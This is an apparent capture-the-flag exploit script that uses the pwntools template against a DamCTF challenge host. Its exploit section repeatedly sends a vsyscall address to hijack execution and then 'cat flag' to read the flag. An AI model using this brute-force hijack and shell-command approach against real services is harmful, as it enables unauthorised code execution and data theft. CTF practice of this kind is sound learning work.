#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host chals.damctf.xyz --port 32556
from pwn import *
# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './path/to/binary'
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'chals.damctf.xyz'
port = int(args.PORT or 32556)
def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)
# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
for i in range(0, 1000):
    io = start()
    log.info(io.recvline())
    io.sendline(hex(0xffffffffff600400))
    io.sendline("cat flag")
    data = io.recvall(timeout=.75)
    log.info(data)
    time.sleep(.5)